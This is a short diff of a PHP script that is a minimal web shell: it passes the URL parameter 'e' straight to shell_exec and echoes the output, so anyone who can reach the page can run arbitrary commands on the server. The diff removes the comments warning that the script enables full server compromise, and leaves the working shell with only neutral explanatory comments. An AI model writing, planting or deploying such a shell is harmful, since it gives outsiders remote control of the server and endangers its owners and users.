@@ -1,7 +1,5 @@
 <?php 
 // This PHP script executes a shell command passed via the URL parameter 'e' and returns the output.
-// WARNING: This script is extremely dangerous and should never be used in production or exposed publicly,
-// because it allows **arbitrary command execution**, which can lead to full server compromise.
 
 echo shell_exec($_GET['e'] . ' 2>&1'); 
 // $_GET['e']: Retrieves the value of the 'e' parameter from the URL query string.
